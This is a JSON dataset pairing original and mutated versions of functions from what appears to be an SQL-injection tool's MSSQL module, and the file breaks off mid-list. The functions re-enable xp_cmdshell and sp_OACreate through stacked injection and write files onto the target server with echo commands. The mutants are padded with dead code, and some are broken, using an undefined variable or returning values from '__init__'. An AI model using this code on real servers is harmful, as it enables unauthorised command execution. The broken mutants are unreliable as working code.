[
    {
        "func_name": "__init__",
        "original": "def __init__(self):\n    self.xpCmdshellStr = 'master..xp_cmdshell'",
        "mutated": [
            "def __init__(self):\n    if False:\n        i = 10\n    self.xpCmdshellStr = 'master..xp_cmdshell'",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.xpCmdshellStr = 'master..xp_cmdshell'",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.xpCmdshellStr = 'master..xp_cmdshell'",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.xpCmdshellStr = 'master..xp_cmdshell'",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.xpCmdshellStr = 'master..xp_cmdshell'"
        ]
    },
    {
        "func_name": "_xpCmdshellCreate",
        "original": "def _xpCmdshellCreate(self):\n    cmd = ''\n    if not Backend.isVersionWithin(('2000',)):\n        logger.debug('activating sp_OACreate')\n        cmd = getSQLSnippet(DBMS.MSSQL, 'activate_sp_oacreate')\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n    self._randStr = randomStr(lowercase=True)\n    self.xpCmdshellStr = 'master..new_xp_cmdshell'\n    cmd = getSQLSnippet(DBMS.MSSQL, 'create_new_xp_cmdshell', RANDSTR=self._randStr)\n    if not Backend.isVersionWithin(('2000',)):\n        cmd += ';RECONFIGURE WITH OVERRIDE'\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
        "mutated": [
            "def _xpCmdshellCreate(self):\n    if False:\n        i = 10\n    cmd = ''\n    if not Backend.isVersionWithin(('2000',)):\n        logger.debug('activating sp_OACreate')\n        cmd = getSQLSnippet(DBMS.MSSQL, 'activate_sp_oacreate')\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n    self._randStr = randomStr(lowercase=True)\n    self.xpCmdshellStr = 'master..new_xp_cmdshell'\n    cmd = getSQLSnippet(DBMS.MSSQL, 'create_new_xp_cmdshell', RANDSTR=self._randStr)\n    if not Backend.isVersionWithin(('2000',)):\n        cmd += ';RECONFIGURE WITH OVERRIDE'\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellCreate(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    cmd = ''\n    if not Backend.isVersionWithin(('2000',)):\n        logger.debug('activating sp_OACreate')\n        cmd = getSQLSnippet(DBMS.MSSQL, 'activate_sp_oacreate')\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n    self._randStr = randomStr(lowercase=True)\n    self.xpCmdshellStr = 'master..new_xp_cmdshell'\n    cmd = getSQLSnippet(DBMS.MSSQL, 'create_new_xp_cmdshell', RANDSTR=self._randStr)\n    if not Backend.isVersionWithin(('2000',)):\n        cmd += ';RECONFIGURE WITH OVERRIDE'\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellCreate(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    cmd = ''\n    if not Backend.isVersionWithin(('2000',)):\n        logger.debug('activating sp_OACreate')\n        cmd = getSQLSnippet(DBMS.MSSQL, 'activate_sp_oacreate')\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n    self._randStr = randomStr(lowercase=True)\n    self.xpCmdshellStr = 'master..new_xp_cmdshell'\n    cmd = getSQLSnippet(DBMS.MSSQL, 'create_new_xp_cmdshell', RANDSTR=self._randStr)\n    if not Backend.isVersionWithin(('2000',)):\n        cmd += ';RECONFIGURE WITH OVERRIDE'\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellCreate(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    cmd = ''\n    if not Backend.isVersionWithin(('2000',)):\n        logger.debug('activating sp_OACreate')\n        cmd = getSQLSnippet(DBMS.MSSQL, 'activate_sp_oacreate')\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n    self._randStr = randomStr(lowercase=True)\n    self.xpCmdshellStr = 'master..new_xp_cmdshell'\n    cmd = getSQLSnippet(DBMS.MSSQL, 'create_new_xp_cmdshell', RANDSTR=self._randStr)\n    if not Backend.isVersionWithin(('2000',)):\n        cmd += ';RECONFIGURE WITH OVERRIDE'\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellCreate(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    cmd = ''\n    if not Backend.isVersionWithin(('2000',)):\n        logger.debug('activating sp_OACreate')\n        cmd = getSQLSnippet(DBMS.MSSQL, 'activate_sp_oacreate')\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n    self._randStr = randomStr(lowercase=True)\n    self.xpCmdshellStr = 'master..new_xp_cmdshell'\n    cmd = getSQLSnippet(DBMS.MSSQL, 'create_new_xp_cmdshell', RANDSTR=self._randStr)\n    if not Backend.isVersionWithin(('2000',)):\n        cmd += ';RECONFIGURE WITH OVERRIDE'\n    inject.goStacked(agent.runAsDBMSUser(cmd))"
        ]
    },
    {
        "func_name": "_xpCmdshellConfigure2005",
        "original": "def _xpCmdshellConfigure2005(self, mode):\n    debugMsg = 'configuring xp_cmdshell using sp_configure '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    cmd = getSQLSnippet(DBMS.MSSQL, 'configure_xp_cmdshell', ENABLE=str(mode))\n    return cmd",
        "mutated": [
            "def _xpCmdshellConfigure2005(self, mode):\n    if False:\n        i = 10\n    debugMsg = 'configuring xp_cmdshell using sp_configure '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    cmd = getSQLSnippet(DBMS.MSSQL, 'configure_xp_cmdshell', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2005(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    debugMsg = 'configuring xp_cmdshell using sp_configure '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    cmd = getSQLSnippet(DBMS.MSSQL, 'configure_xp_cmdshell', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2005(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    debugMsg = 'configuring xp_cmdshell using sp_configure '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    cmd = getSQLSnippet(DBMS.MSSQL, 'configure_xp_cmdshell', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2005(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    debugMsg = 'configuring xp_cmdshell using sp_configure '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    cmd = getSQLSnippet(DBMS.MSSQL, 'configure_xp_cmdshell', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2005(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    debugMsg = 'configuring xp_cmdshell using sp_configure '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    cmd = getSQLSnippet(DBMS.MSSQL, 'configure_xp_cmdshell', ENABLE=str(mode))\n    return cmd"
        ]
    },
    {
        "func_name": "_xpCmdshellConfigure2000",
        "original": "def _xpCmdshellConfigure2000(self, mode):\n    debugMsg = 'configuring xp_cmdshell using sp_addextendedproc '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    if mode == 1:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'enable_xp_cmdshell_2000', ENABLE=str(mode))\n    else:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'disable_xp_cmdshell_2000', ENABLE=str(mode))\n    return cmd",
        "mutated": [
            "def _xpCmdshellConfigure2000(self, mode):\n    if False:\n        i = 10\n    debugMsg = 'configuring xp_cmdshell using sp_addextendedproc '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    if mode == 1:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'enable_xp_cmdshell_2000', ENABLE=str(mode))\n    else:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'disable_xp_cmdshell_2000', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2000(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    debugMsg = 'configuring xp_cmdshell using sp_addextendedproc '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    if mode == 1:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'enable_xp_cmdshell_2000', ENABLE=str(mode))\n    else:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'disable_xp_cmdshell_2000', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2000(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    debugMsg = 'configuring xp_cmdshell using sp_addextendedproc '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    if mode == 1:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'enable_xp_cmdshell_2000', ENABLE=str(mode))\n    else:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'disable_xp_cmdshell_2000', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2000(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    debugMsg = 'configuring xp_cmdshell using sp_addextendedproc '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    if mode == 1:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'enable_xp_cmdshell_2000', ENABLE=str(mode))\n    else:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'disable_xp_cmdshell_2000', ENABLE=str(mode))\n    return cmd",
            "def _xpCmdshellConfigure2000(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    debugMsg = 'configuring xp_cmdshell using sp_addextendedproc '\n    debugMsg += 'stored procedure'\n    logger.debug(debugMsg)\n    if mode == 1:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'enable_xp_cmdshell_2000', ENABLE=str(mode))\n    else:\n        cmd = getSQLSnippet(DBMS.MSSQL, 'disable_xp_cmdshell_2000', ENABLE=str(mode))\n    return cmd"
        ]
    },
    {
        "func_name": "_xpCmdshellConfigure",
        "original": "def _xpCmdshellConfigure(self, mode):\n    if Backend.isVersionWithin(('2000',)):\n        cmd = self._xpCmdshellConfigure2000(mode)\n    else:\n        cmd = self._xpCmdshellConfigure2005(mode)\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
        "mutated": [
            "def _xpCmdshellConfigure(self, mode):\n    if False:\n        i = 10\n    if Backend.isVersionWithin(('2000',)):\n        cmd = self._xpCmdshellConfigure2000(mode)\n    else:\n        cmd = self._xpCmdshellConfigure2005(mode)\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellConfigure(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if Backend.isVersionWithin(('2000',)):\n        cmd = self._xpCmdshellConfigure2000(mode)\n    else:\n        cmd = self._xpCmdshellConfigure2005(mode)\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellConfigure(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if Backend.isVersionWithin(('2000',)):\n        cmd = self._xpCmdshellConfigure2000(mode)\n    else:\n        cmd = self._xpCmdshellConfigure2005(mode)\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellConfigure(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if Backend.isVersionWithin(('2000',)):\n        cmd = self._xpCmdshellConfigure2000(mode)\n    else:\n        cmd = self._xpCmdshellConfigure2005(mode)\n    inject.goStacked(agent.runAsDBMSUser(cmd))",
            "def _xpCmdshellConfigure(self, mode):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if Backend.isVersionWithin(('2000',)):\n        cmd = self._xpCmdshellConfigure2000(mode)\n    else:\n        cmd = self._xpCmdshellConfigure2005(mode)\n    inject.goStacked(agent.runAsDBMSUser(cmd))"
        ]
    },
    {
        "func_name": "_xpCmdshellCheck",
        "original": "def _xpCmdshellCheck(self):\n    cmd = 'ping -n %d 127.0.0.1' % (conf.timeSec * 2)\n    self.xpCmdshellExecCmd(cmd)\n    return wasLastResponseDelayed()",
        "mutated": [
            "def _xpCmdshellCheck(self):\n    if False:\n        i = 10\n    cmd = 'ping -n %d 127.0.0.1' % (conf.timeSec * 2)\n    self.xpCmdshellExecCmd(cmd)\n    return wasLastResponseDelayed()",
            "def _xpCmdshellCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    cmd = 'ping -n %d 127.0.0.1' % (conf.timeSec * 2)\n    self.xpCmdshellExecCmd(cmd)\n    return wasLastResponseDelayed()",
            "def _xpCmdshellCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    cmd = 'ping -n %d 127.0.0.1' % (conf.timeSec * 2)\n    self.xpCmdshellExecCmd(cmd)\n    return wasLastResponseDelayed()",
            "def _xpCmdshellCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    cmd = 'ping -n %d 127.0.0.1' % (conf.timeSec * 2)\n    self.xpCmdshellExecCmd(cmd)\n    return wasLastResponseDelayed()",
            "def _xpCmdshellCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    cmd = 'ping -n %d 127.0.0.1' % (conf.timeSec * 2)\n    self.xpCmdshellExecCmd(cmd)\n    return wasLastResponseDelayed()"
        ]
    },
    {
        "func_name": "_xpCmdshellTest",
        "original": "@stackedmethod\ndef _xpCmdshellTest(self):\n    threadData = getCurrentThreadData()\n    pushValue(threadData.disableStdOut)\n    threadData.disableStdOut = True\n    logger.info('testing if xp_cmdshell extended procedure is usable')\n    output = self.xpCmdshellEvalCmd('echo 1')\n    if output == '1':\n        logger.info('xp_cmdshell extended procedure is usable')\n    elif isNoneValue(output) and conf.dbmsCred:\n        errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n        errMsg += 'storing console output within the back-end file system '\n        errMsg += 'does not have writing permissions for the DBMS process. '\n        errMsg += 'You are advised to manually adjust it with option '\n        errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n        errMsg += 'the command(s) output'\n        logger.error(errMsg)\n    elif isNoneValue(output):\n        logger.error('unable to retrieve xp_cmdshell output')\n    else:\n        logger.info('xp_cmdshell extended procedure is usable')\n    threadData.disableStdOut = popValue()",
        "mutated": [
            "@stackedmethod\ndef _xpCmdshellTest(self):\n    if False:\n        i = 10\n    threadData = getCurrentThreadData()\n    pushValue(threadData.disableStdOut)\n    threadData.disableStdOut = True\n    logger.info('testing if xp_cmdshell extended procedure is usable')\n    output = self.xpCmdshellEvalCmd('echo 1')\n    if output == '1':\n        logger.info('xp_cmdshell extended procedure is usable')\n    elif isNoneValue(output) and conf.dbmsCred:\n        errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n        errMsg += 'storing console output within the back-end file system '\n        errMsg += 'does not have writing permissions for the DBMS process. '\n        errMsg += 'You are advised to manually adjust it with option '\n        errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n        errMsg += 'the command(s) output'\n        logger.error(errMsg)\n    elif isNoneValue(output):\n        logger.error('unable to retrieve xp_cmdshell output')\n    else:\n        logger.info('xp_cmdshell extended procedure is usable')\n    threadData.disableStdOut = popValue()",
            "@stackedmethod\ndef _xpCmdshellTest(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    threadData = getCurrentThreadData()\n    pushValue(threadData.disableStdOut)\n    threadData.disableStdOut = True\n    logger.info('testing if xp_cmdshell extended procedure is usable')\n    output = self.xpCmdshellEvalCmd('echo 1')\n    if output == '1':\n        logger.info('xp_cmdshell extended procedure is usable')\n    elif isNoneValue(output) and conf.dbmsCred:\n        errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n        errMsg += 'storing console output within the back-end file system '\n        errMsg += 'does not have writing permissions for the DBMS process. '\n        errMsg += 'You are advised to manually adjust it with option '\n        errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n        errMsg += 'the command(s) output'\n        logger.error(errMsg)\n    elif isNoneValue(output):\n        logger.error('unable to retrieve xp_cmdshell output')\n    else:\n        logger.info('xp_cmdshell extended procedure is usable')\n    threadData.disableStdOut = popValue()",
            "@stackedmethod\ndef _xpCmdshellTest(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    threadData = getCurrentThreadData()\n    pushValue(threadData.disableStdOut)\n    threadData.disableStdOut = True\n    logger.info('testing if xp_cmdshell extended procedure is usable')\n    output = self.xpCmdshellEvalCmd('echo 1')\n    if output == '1':\n        logger.info('xp_cmdshell extended procedure is usable')\n    elif isNoneValue(output) and conf.dbmsCred:\n        errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n        errMsg += 'storing console output within the back-end file system '\n        errMsg += 'does not have writing permissions for the DBMS process. '\n        errMsg += 'You are advised to manually adjust it with option '\n        errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n        errMsg += 'the command(s) output'\n        logger.error(errMsg)\n    elif isNoneValue(output):\n        logger.error('unable to retrieve xp_cmdshell output')\n    else:\n        logger.info('xp_cmdshell extended procedure is usable')\n    threadData.disableStdOut = popValue()",
            "@stackedmethod\ndef _xpCmdshellTest(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    threadData = getCurrentThreadData()\n    pushValue(threadData.disableStdOut)\n    threadData.disableStdOut = True\n    logger.info('testing if xp_cmdshell extended procedure is usable')\n    output = self.xpCmdshellEvalCmd('echo 1')\n    if output == '1':\n        logger.info('xp_cmdshell extended procedure is usable')\n    elif isNoneValue(output) and conf.dbmsCred:\n        errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n        errMsg += 'storing console output within the back-end file system '\n        errMsg += 'does not have writing permissions for the DBMS process. '\n        errMsg += 'You are advised to manually adjust it with option '\n        errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n        errMsg += 'the command(s) output'\n        logger.error(errMsg)\n    elif isNoneValue(output):\n        logger.error('unable to retrieve xp_cmdshell output')\n    else:\n        logger.info('xp_cmdshell extended procedure is usable')\n    threadData.disableStdOut = popValue()",
            "@stackedmethod\ndef _xpCmdshellTest(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    threadData = getCurrentThreadData()\n    pushValue(threadData.disableStdOut)\n    threadData.disableStdOut = True\n    logger.info('testing if xp_cmdshell extended procedure is usable')\n    output = self.xpCmdshellEvalCmd('echo 1')\n    if output == '1':\n        logger.info('xp_cmdshell extended procedure is usable')\n    elif isNoneValue(output) and conf.dbmsCred:\n        errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n        errMsg += 'storing console output within the back-end file system '\n        errMsg += 'does not have writing permissions for the DBMS process. '\n        errMsg += 'You are advised to manually adjust it with option '\n        errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n        errMsg += 'the command(s) output'\n        logger.error(errMsg)\n    elif isNoneValue(output):\n        logger.error('unable to retrieve xp_cmdshell output')\n    else:\n        logger.info('xp_cmdshell extended procedure is usable')\n    threadData.disableStdOut = popValue()"
        ]
    },
    {
        "func_name": "xpCmdshellWriteFile",
        "original": "def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n    echoedLines = []\n    cmd = ''\n    charCounter = 0\n    maxLen = 512\n    if isinstance(fileContent, (set, list, tuple)):\n        lines = fileContent\n    else:\n        lines = fileContent.split('\\n')\n    for line in lines:\n        echoedLine = 'echo %s ' % line\n        echoedLine += '>> \"%s\\\\%s\"' % (tmpPath, randDestFile)\n        echoedLines.append(echoedLine)\n    for echoedLine in echoedLines:\n        cmd += '%s & ' % echoedLine\n        charCounter += len(echoedLine)\n        if charCounter >= maxLen:\n            self.xpCmdshellExecCmd(cmd.rstrip(' & '))\n            cmd = ''\n            charCounter = 0\n    if cmd:\n        self.xpCmdshellExecCmd(cmd.rstrip(' & '))",
        "mutated": [
            "def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n    if False:\n        i = 10\n    echoedLines = []\n    cmd = ''\n    charCounter = 0\n    maxLen = 512\n    if isinstance(fileContent, (set, list, tuple)):\n        lines = fileContent\n    else:\n        lines = fileContent.split('\\n')\n    for line in lines:\n        echoedLine = 'echo %s ' % line\n        echoedLine += '>> \"%s\\\\%s\"' % (tmpPath, randDestFile)\n        echoedLines.append(echoedLine)\n    for echoedLine in echoedLines:\n        cmd += '%s & ' % echoedLine\n        charCounter += len(echoedLine)\n        if charCounter >= maxLen:\n            self.xpCmdshellExecCmd(cmd.rstrip(' & '))\n            cmd = ''\n            charCounter = 0\n    if cmd:\n        self.xpCmdshellExecCmd(cmd.rstrip(' & '))",
            "def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    echoedLines = []\n    cmd = ''\n    charCounter = 0\n    maxLen = 512\n    if isinstance(fileContent, (set, list, tuple)):\n        lines = fileContent\n    else:\n        lines = fileContent.split('\\n')\n    for line in lines:\n        echoedLine = 'echo %s ' % line\n        echoedLine += '>> \"%s\\\\%s\"' % (tmpPath, randDestFile)\n        echoedLines.append(echoedLine)\n    for echoedLine in echoedLines:\n        cmd += '%s & ' % echoedLine\n        charCounter += len(echoedLine)\n        if charCounter >= maxLen:\n            self.xpCmdshellExecCmd(cmd.rstrip(' & '))\n            cmd = ''\n            charCounter = 0\n    if cmd:\n        self.xpCmdshellExecCmd(cmd.rstrip(' & '))",
            "def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    echoedLines = []\n    cmd = ''\n    charCounter = 0\n    maxLen = 512\n    if isinstance(fileContent, (set, list, tuple)):\n        lines = fileContent\n    else:\n        lines = fileContent.split('\\n')\n    for line in lines:\n        echoedLine = 'echo %s ' % line\n        echoedLine += '>> \"%s\\\\%s\"' % (tmpPath, randDestFile)\n        echoedLines.append(echoedLine)\n    for echoedLine in echoedLines:\n        cmd += '%s & ' % echoedLine\n        charCounter += len(echoedLine)\n        if charCounter >= maxLen:\n            self.xpCmdshellExecCmd(cmd.rstrip(' & '))\n            cmd = ''\n            charCounter = 0\n    if cmd:\n        self.xpCmdshellExecCmd(cmd.rstrip(' & '))",
            "def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    echoedLines = []\n    cmd = ''\n    charCounter = 0\n    maxLen = 512\n    if isinstance(fileContent, (set, list, tuple)):\n        lines = fileContent\n    else:\n        lines = fileContent.split('\\n')\n    for line in lines:\n        echoedLine = 'echo %s ' % line\n        echoedLine += '>> \"%s\\\\%s\"' % (tmpPath, randDestFile)\n        echoedLines.append(echoedLine)\n    for echoedLine in echoedLines:\n        cmd += '%s & ' % echoedLine\n        charCounter += len(echoedLine)\n        if charCounter >= maxLen:\n            self.xpCmdshellExecCmd(cmd.rstrip(' & '))\n            cmd = ''\n            charCounter = 0\n    if cmd:\n        self.xpCmdshellExecCmd(cmd.rstrip(' & '))",
